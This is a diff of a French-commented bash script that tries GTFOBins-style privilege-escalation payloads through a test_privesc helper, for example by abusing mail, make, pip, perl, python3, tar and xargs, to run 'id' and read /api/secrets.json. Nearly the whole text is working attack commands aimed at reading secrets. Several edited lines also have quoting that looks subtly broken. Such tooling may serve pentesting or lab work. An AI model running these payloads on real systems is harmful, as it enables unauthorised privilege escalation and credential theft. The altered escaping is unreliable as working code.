@@ -97,7 +97,7 @@ while IFS= read -r line; do
             test_privesc "$binary" "LFILE=/api/secrets.json; mail --exec='!/bin/sh -c \"id; cat $LFILE\"'" "Exécution de commande via --exec"
             ;;
         make)
-            test_privesc "$binary" "make -s --eval=\"\$(echo 'x:\n\t@id; cat /api/secrets.json')\"" "Exécution de commande via eval"
+            test_privesc "$binary" "COMMAND='id; cat /api/secrets.json'; make -s --eval=$'x:\\n\\t-'"$COMMAND" "Exécution de commande via eval"
             ;;
         more)
             test_privesc "$binary" "LFILE=/api/secrets.json; more $LFILE" "Lecture de fichier"
@@ -109,23 +109,24 @@ while IFS= read -r line; do
             test_privesc "$binary" "perl -e 'system(\"id; cat /api/secrets.json\")'" "Exécution de commande via system"
             ;;
         pip)
-            test_privesc "$binary" "TF=\$(mktemp -d); echo 'import os; os.system(\"id; cat /api/secrets.json\")' > \$TF/setup.py; pip install \$TF" "Exécution de commande via installation"
+            test_privesc "$binary" "TF=$(mktemp -d); echo 'import os; os.system(\"id; cat /api/secrets.json\")' > $TF/setup.py; pip install $TF" "Exécution de commande via installation"
             ;;
         python3)
             test_privesc "$binary" "python3 -c 'import os; os.system(\"id; cat /api/secrets.json\")'" "Exécution de commande via system"
             ;;
         sed)
-            test_privesc "$binary" "LFILE=/api/secrets.json; sed -n 'p' \"\$LFILE\"" "Lecture de fichier"
+            test_privesc "$binary" "LFILE=/api/secrets.json; sed -n 'p' \"$LFILE\"" "Lecture de fichier"
             ;;
         tar)
             test_privesc "$binary" "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \"id; cat /api/secrets.json\"'" "Exécution de commande via checkpoint"
             ;;
         tee)
-            test_privesc "$binary" "LFILE=/api/secrets.json; tee < \"\$LFILE\"" "Lecture de fichier"
+            test_privesc "$binary" "LFILE=/api/secrets.json; tee < \"$LFILE\"" "Lecture de fichier"
             ;;
         xargs)
             test_privesc "$binary" "echo | xargs -I% sh -c 'id; cat /api/secrets.json'" "Exécution de commande"
             ;;
+        # Ajoutez d'autres binaires selon vos besoins
         *)
             # Pour les binaires non traités spécifiquement, tenter une exécution simple
             if command -v "$binary" >/dev/null 2>&1; then
